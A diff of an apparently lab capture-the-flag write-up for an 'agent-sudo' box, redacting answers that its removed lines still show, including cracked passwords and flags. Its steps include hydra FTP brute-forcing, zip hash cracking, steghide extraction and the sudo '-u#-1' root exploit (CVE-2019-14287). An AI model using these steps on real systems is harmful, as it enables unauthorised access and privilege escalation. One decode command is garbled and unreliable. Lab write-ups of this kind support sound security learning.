@@ -30,7 +30,7 @@ user-agent
 ```
 3. 
 ```by changing user agent
-chris
+<redacted>
 ```
 
 ##Hash Cracking and brute-forcing
@@ -39,7 +39,7 @@ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent-sudo
 ```
 1. found by using hydra
 ```
-[21][ftp] host: agent-sudo   login: chris   password: crystal
+[21][ftp] host: agent-sudo   login: chris   password: <redacted>
 ```
 2. 
 ```TO_agentJ
@@ -55,7 +55,7 @@ zip2john 8702.zip > forjohn
 john --wordlist=/usr/share/wordlist/rockyou.txt forjohn 
 ```
 ```zip
-alien
+<redacted>
 ```
 ```To_agentR
 Agent C,
@@ -69,12 +69,12 @@ Agent R
 echo QXJlYTUx > bas364 -d
 ```
 ```
-Area51
+<redacted>
 ```
 3. 
 ```bash
 steghide extract -sf cute_alien.jpg
-Area51
+<redacted>
 ```
 ```message.txt from cute_jpg.txt
 Hi james,
@@ -87,7 +87,7 @@ Your buddy,
 chris
 ```
 ```
-hackerrules!
+<redacted>
 ```
 
 ##Capture the user flag
@@ -96,23 +96,23 @@ hackerrules!
 ssh james@agent-sudo
 ```
 ```user-flag
-b03d975e8c92a7c04146cfa7a5a313c7
+<redacted>
 ```
 ```by using google reverse image to search the Alien_autopsy.jpg
-roswell alien autopsy
+****** alien ******
 ```
 
 ##Privilege Escalation
 
 ```firefox cve sudo
-CVE-2019-14287
+CVE-2019-*****
 ```
 ```bash
 sudo -u#-1 /bin/bash
 ```
 ```root_flag
-b53a02f55b57d4439e3341834d70c062
+<redacted>
 ```
 ```a.k.a AgentR
-DesKel
+<redacted>
 ```
